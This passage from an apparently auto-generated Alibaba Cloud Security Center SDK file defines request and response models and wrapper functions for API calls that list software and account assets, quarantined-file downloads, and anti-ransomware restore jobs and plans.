model DescribePropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScheduleConfigResponseBody(name='body'),
}

async function describePropertyScheduleConfigWithOptions(request: DescribePropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribePropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScheduleConfig(request: DescribePropertyScheduleConfigRequest): DescribePropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScheduleConfigWithOptions(request, runtime);
}

model DescribePropertySoftwareDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  installTimeEnd?: long(name='InstallTimeEnd'),
  installTimeStart?: long(name='InstallTimeStart'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  path?: string(name='Path'),
  remark?: string(name='Remark'),
  softwareVersion?: string(name='SoftwareVersion'),
  uuid?: string(name='Uuid'),
}

model DescribePropertySoftwareDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp'),
      installTime?: string(name='InstallTime'),
      installTimeDt?: long(name='InstallTimeDt'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      name?: string(name='Name'),
      path?: string(name='Path'),
      uuid?: string(name='Uuid'),
      version?: string(name='Version'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertySoftwareDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareDetailResponseBody(name='body'),
}

async function describePropertySoftwareDetailWithOptions(request: DescribePropertySoftwareDetailRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.installTimeEnd)) {
    query['InstallTimeEnd'] = request.installTimeEnd;
  }
  if (!Util.isUnset(request.installTimeStart)) {
    query['InstallTimeStart'] = request.installTimeStart;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.softwareVersion)) {
    query['SoftwareVersion'] = request.softwareVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareDetail(request: DescribePropertySoftwareDetailRequest): DescribePropertySoftwareDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareDetailWithOptions(request, runtime);
}

model DescribePropertySoftwareItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  name?: string(name='Name', description='The name of the software that you want to query.', example='test'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
}

model DescribePropertySoftwareItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5037'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the software is installed.', example='23'),
      name?: string(name='Name', description='The name of the software.', example='aaa_base'),
    }
  ](name='PropertyItems', description='An array that consists of the software assets returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
}

model DescribePropertySoftwareItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareItemResponseBody(name='body'),
}

async function describePropertySoftwareItemWithOptions(request: DescribePropertySoftwareItemRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareItem(request: DescribePropertySoftwareItemRequest): DescribePropertySoftwareItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareItemWithOptions(request, runtime);
}

model DescribePropertyTypeScaItemRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='en'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribePropertyTypeScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  propertyTypeItems?: [ 
    {
      name?: string(name='Name', example='Docker Component'),
      type?: string(name='Type', example='docker_component'),
    }
  ](name='PropertyTypeItems'),
  requestId?: string(name='RequestId', example='B7A839E8-70AE-591D-8D9E-C5419A22****'),
}

model DescribePropertyTypeScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyTypeScaItemResponseBody(name='body'),
}

async function describePropertyTypeScaItemWithOptions(request: DescribePropertyTypeScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyTypeScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyTypeScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyTypeScaItem(request: DescribePropertyTypeScaItemRequest): DescribePropertyTypeScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyTypeScaItemWithOptions(request, runtime);
}

model DescribePropertyUsageNewestRequest {
  type?: string(name='Type', description='The type of the accounts.

Valid values:

*   user
*   system', example='user'),
}

model DescribePropertyUsageNewestResponseBody = {
  itemCount?: int32(name='ItemCount', description='The number of accounts.', example='5'),
  newestStatisticItems?: [ 
    {
      create?: long(name='Create', description='The time when the account was created.', example='1566178646000'),
      name?: string(name='Name', description='The username of the account.', example='root'),
    }
  ](name='NewestStatisticItems', description='An array that consists of the accounts.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='27C78A20-0833-4519-B392-F7963CCFC6AC'),
  type?: string(name='Type', description='The type of the accounts that are created on the server. The value is fixed as user, which indicates user accounts.', example='user'),
}

model DescribePropertyUsageNewestResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUsageNewestResponseBody(name='body'),
}

async function describePropertyUsageNewestWithOptions(request: DescribePropertyUsageNewestRequest, runtime: Util.RuntimeOptions): DescribePropertyUsageNewestResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUsageNewest',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUsageNewest(request: DescribePropertyUsageNewestRequest): DescribePropertyUsageNewestResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUsageNewestWithOptions(request, runtime);
}

model DescribePropertyUserDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether the fuzzy search by account name is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  isRoot?: string(name='IsRoot', description='Specifies whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lastLoginTimeEnd?: long(name='LastLoginTimeEnd', description='The timestamp of the last logoff from the account. Unit: milliseconds.', example='164922523600'),
  lastLoginTimeStart?: long(name='LastLoginTimeStart', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='164922523600'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  user?: string(name='User', description='The name of the account to which the server belongs.', example='bin'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyUserDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      accountsExpirationDate?: string(name='AccountsExpirationDate', description='The date on which the account expires.', example='never'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp at which the last asset fingerprint collection is performed. Unit: milliseconds.', example='1649149566000'),
      groupNames?: [ string ](name='GroupNames', description='The details of the user groups to which the account belongs.'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      isCouldLogin?: int32(name='IsCouldLogin', description='Indicates whether the account is an interactive logon account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isPasswdExpired?: int32(name='IsPasswdExpired', description='Indicates whether the password expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isPasswdLocked?: int32(name='IsPasswdLocked', description='Indicates whether the password is locked. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      isRoot?: string(name='IsRoot', description='Indicates whether the account has root permissions. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isSudoer?: int32(name='IsSudoer', description='Indicates whether the account is a sudo account. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
      isUserExpired?: int32(name='IsUserExpired', description='Indicates whether the account expires. Valid values:

*   **0**: yes
*   **1**: no', example='1'),
      lastLoginIp?: string(name='LastLoginIp', description='The source IP address of the last logon to the account.', example='192.168.XX.XX'),
      lastLoginTime?: string(name='LastLoginTime', description='The last logon time of the account.', example='2022-04-04 18:07:06'),
      lastLoginTimeDt?: long(name='LastLoginTimeDt', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp of the last logon to the account. Unit: milliseconds.', example='1649066826000'),
      passwordExpirationDate?: string(name='PasswordExpirationDate', description='The date on which the password of the account expires.', example='never'),
      status?: string(name='Status', description='This parameter is deprecated. You can ignore it.', example='**'),
      user?: string(name='User', description='The name of the account.', example='bin'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of asset fingerprints for the account.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='33A71BE3-2CC2-14CB-B460-33A1DD82953A'),
}

model DescribePropertyUserDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserDetailResponseBody(name='body'),
}

async function describePropertyUserDetailWithOptions(request: DescribePropertyUserDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyUserDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.isRoot)) {
    query['IsRoot'] = request.isRoot;
  }
  if (!Util.isUnset(request.lastLoginTimeEnd)) {
    query['LastLoginTimeEnd'] = request.lastLoginTimeEnd;
  }
  if (!Util.isUnset(request.lastLoginTimeStart)) {
    query['LastLoginTimeStart'] = request.lastLoginTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserDetail(request: DescribePropertyUserDetailRequest): DescribePropertyUserDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserDetailWithOptions(request, runtime);
}

model DescribePropertyUserItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  pageSize?: int32(name='PageSize'),
  user?: string(name='User'),
}

model DescribePropertyUserItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      user?: string(name='User'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyUserItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyUserItemResponseBody(name='body'),
}

async function describePropertyUserItemWithOptions(request: DescribePropertyUserItemRequest, runtime: Util.RuntimeOptions): DescribePropertyUserItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyUserItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyUserItem(request: DescribePropertyUserItemRequest): DescribePropertyUserItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyUserItemWithOptions(request, runtime);
}

model DescribeQuaraFileDownloadInfoRequest {
  from?: string(name='From', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', example='123'),
}

model DescribeQuaraFileDownloadInfoResponseBody = {
  downloadUrl?: string(name='DownloadUrl', example='https://xxxxxxxx.oss-cn-hangzhou-1.aliyuncs.com/xxxxx/xxxxxxxxxxxxxx?Expires=1671448125&OSSAccessKeyId=xxx'),
  md5?: string(name='Md5', example='bb62ef1311bc564377a0378d3axxxxxx'),
  path?: string(name='Path', example='/etc/test'),
  quaraFileId?: int32(name='QuaraFileId', example='123'),
  requestId?: string(name='RequestId', example='29874225-EAAC-5415-8501-32DD20FXXXXX'),
  tag?: string(name='Tag', example='6d4ff40a22b15c86adecf2aa48xxxxx'),
  uuid?: string(name='Uuid', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model DescribeQuaraFileDownloadInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeQuaraFileDownloadInfoResponseBody(name='body'),
}

async function describeQuaraFileDownloadInfoWithOptions(request: DescribeQuaraFileDownloadInfoRequest, runtime: Util.RuntimeOptions): DescribeQuaraFileDownloadInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeQuaraFileDownloadInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeQuaraFileDownloadInfo(request: DescribeQuaraFileDownloadInfoRequest): DescribeQuaraFileDownloadInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeQuaraFileDownloadInfoWithOptions(request, runtime);
}

model DescribeRestoreJobsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The unique identifier of the server on which the restoration task is run. For example, you can use the IP address or the name of the server.', example='1.1.XX.XX'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task is created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='RUNNING'),
}

model DescribeRestoreJobsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of restoration tasks returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of restoration tasks returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
  restoreJobs?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The size of backup data. Unit: bytes.', example='20'),
      bytesDone?: long(name='BytesDone', description='The total size of data that is restored. Unit: bytes.', example='20'),
      bytesTotal?: long(name='BytesTotal', description='The total size of data that you want to restore. Unit: bytes.', example='20'),
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent that is used to restore data.', example='c-000frxwusjauhp9ajpu6'),
      completeTime?: long(name='CompleteTime', description='The timestamp when the restoration task is complete. Unit: milliseconds.', example='1583289054000'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the restoration task is created. Unit: milliseconds.', example='1583289052000'),
      duration?: long(name='Duration', description='The duration of the restoration task. Unit: seconds.', example='100'),
      errorCount?: long(name='ErrorCount', description='The number of the restoration tasks on which errors occur.', example='0'),
      errorFile?: string(name='ErrorFile', description='The name of the CSV file. The CSV file contains the files that fail to be restored.', example='s-000f4wxm8f7gur6g2otm.csv'),
      errorFileUrl?: string(name='ErrorFileUrl', description='The URL to download the CSV file. The CSV file contains the files that fail to be restored.', example='["/home/user"]'),
      errorType?: string(name='ErrorType', description='The error code that is returned for the restoration task.', example='NONE'),
      eta?: long(name='Eta', description='The timestamp when the in-progress restoration task is expected to be complete. Unit: seconds.', example='1583299054'),
      excludes?: string(name='Excludes', description='The directory excluded from the anti-ransomware policy. The value is the directory that you specify to skip protection when you create the anti-ransomware policy.', example='["/home/user"]'),
      exitCode?: string(name='ExitCode', description='The return value of the restoration task.', example='0'),
      gmtCreate?: string(name='GmtCreate', description='The time when the restoration task is created.', example='2021-04-25T19:11Z'),
      gmtModified?: string(name='GmtModified', description='The time when the restoration task is updated.', example='2021-04-25T19:11Z'),
      includes?: string(name='Includes', description='The included directory based on which the files to restore are located. The value is the directory that you specify for protection when you create the anti-ransomware policy', example='["/root/disk-uuid-test","/root/install.sh"]'),
      instanceId?: string(name='InstanceId', description='The ID of the server whose data you want to restore.', example='i-bp12xnvdax6307gw****'),
      instanceName?: string(name='InstanceName', description='The name of the server whose data you want to restore.', example='win2012-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server whose data you want to restore.', example='1.1.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The internal IP address of the server whose data you want to restore.', example='2.1.XX.XX'),
      itemsDone?: long(name='ItemsDone', description='The number of files that are backed up.', example='0'),
      itemsTotal?: long(name='ItemsTotal', description='The total number of files that you want to restore.', example='0'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      percentage?: int32(name='Percentage', description='The progress of the restoration task in percentage.', example='100'),
      requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0ED92280-4363-57D3-A4D3-4D3FBC99B29F'),
      restoreId?: string(name='RestoreId', description='The ID of the restoration task.', example='r-000gmcypy5dyf9ey3uv7'),
      restoreName?: string(name='RestoreName', description='The name of the restoration task.', example='Restore'),
      restoreType?: string(name='RestoreType', description='The type of the file that is restored. Valid values:

*   **ECS_FILE**: files on Elastic Compute Service (ECS) instances
*   **FILE**: files on servers in data centers', example='ECS_FILE'),
      snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot that stores backup data when the data is backed up.', example='a3992de83f529b844135fe795d949181735a7d20e0ac8539485c61b7983e618f'),
      snapshotId?: string(name='SnapshotId', description='The hash value ID of the snapshot that stores backup data when the data is backed up.', example='s-000gmcypy5dy54e39yny'),
      snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.', example='2020-03-03 18:00'),
      source?: string(name='Source', description='The path to the source file that you want to restore.', example='["/home/admin","\\\\\\\\servername\\\\sharename"]'),
      sourceClientId?: string(name='SourceClientId', description='The ID of the anti-ransomware agent that is used to back up data.', example='c-000gmcypy5dyf9ey3uv7'),
      speed?: long(name='Speed', description='The speed of data restoration. Unit: byte/s.', example='25766558'),
      status?: string(name='Status', description='The status of the restoration task. Valid values:

*   **RUNNING**: The task is running.
*   **COMPLETE**: The task is complete.
*   **FAILED**: The task fails.
*   **CANCELING**: The task is being canceled.
*   **CANCELED**: The task is canceled.
*   **PARTIAL_COMPLETE**: The task is partially successful.
*   **CREATED**: The task is created but is not run.
*   **EXPIRED**: The task is not updated.
*   **QUEUED**: The task is waiting to be run.
*   **CLIENT_DELETED**: The task fails because the anti-ransomware agent is uninstalled.', example='COMPLETE'),
      target?: string(name='Target', description='The folder to which the backup data is restored. After you create the restoration task, the backup data is restored to the specified folder.', example='/home'),
      updatedTime?: long(name='UpdatedTime', description='The timestamp when the restoration task was last updated. Unit: milliseconds.', example='1583289054000'),
      uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='6E3DABB6-3F6A-40DB-9492-2C8B59C****'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-000b0v0jqzmse2yz06zw'),
    }
  ](name='RestoreJobs', description='An array that consists of the restoration tasks.'),
}

model DescribeRestoreJobsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestoreJobsResponseBody(name='body'),
}

/**
  * If the data on your servers is encrypted by ransomware, you can create a restoration task to restore the data on your servers by using backup data in Security Center.
  * >  After you enable an anti-ransomware policy, the data on your servers is backed up based on the policy. For more information about anti-ransomware policies, see [Manage protection policies](~~164781~~).
  *
  * @param request DescribeRestoreJobsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobsWithOptions(request: DescribeRestoreJobsRequest, runtime: Util.RuntimeOptions): DescribeRestoreJobsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestoreJobs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If the data on your servers is encrypted by ransomware, you can create a restoration task to restore the data on your servers by using backup data in Security Center.
  * >  After you enable an anti-ransomware policy, the data on your servers is backed up based on the policy. For more information about anti-ransomware policies, see [Manage protection policies](~~164781~~).
  *
  * @param request DescribeRestoreJobsRequest
  * @return DescribeRestoreJobsResponse
 */
async function describeRestoreJobs(request: DescribeRestoreJobsRequest): DescribeRestoreJobsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeRestoreJobsWithOptions(request, runtime);
}

model DescribeRestorePlansRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  instanceName?: string(name='InstanceName', example='sql-test-001'),
  pageSize?: int32(name='PageSize', example='20'),
  status?: string(name='Status', example='running'),
}

model DescribeRestorePlansResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='33'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  restorePlans?: [ 
    {
      createdTime?: long(name='CreatedTime', example='1655174753****'),
      databaseName?: string(name='DatabaseName', example='Bankup****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      policyId?: long(name='PolicyId', example='123'),
      policyName?: string(name='PolicyName', example='KtDataBase'),
      restorePoint?: long(name='RestorePoint', example='165875100****'),
      status?: string(name='Status', example='running'),
      targetDatabaseName?: string(name='TargetDatabaseName', example='OABak'),
      targetInstanceId?: string(name='TargetInstanceId', example='i-2zehqflgbl9ep2he****'),
      targetInstanceName?: string(name='TargetInstanceName', example='hbr-detection-hh'),
      updatedTime?: long(name='UpdatedTime', example='166849080****'),
    }
  ](name='RestorePlans'),
}

model DescribeRestorePlansResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeRestorePlansResponseBody(name='body'),
}

async function describeRestorePlansWithOptions(request: DescribeRestorePlansRequest, runtime: Util.RuntimeOptions): DescribeRestorePlansResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeRestorePlans',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
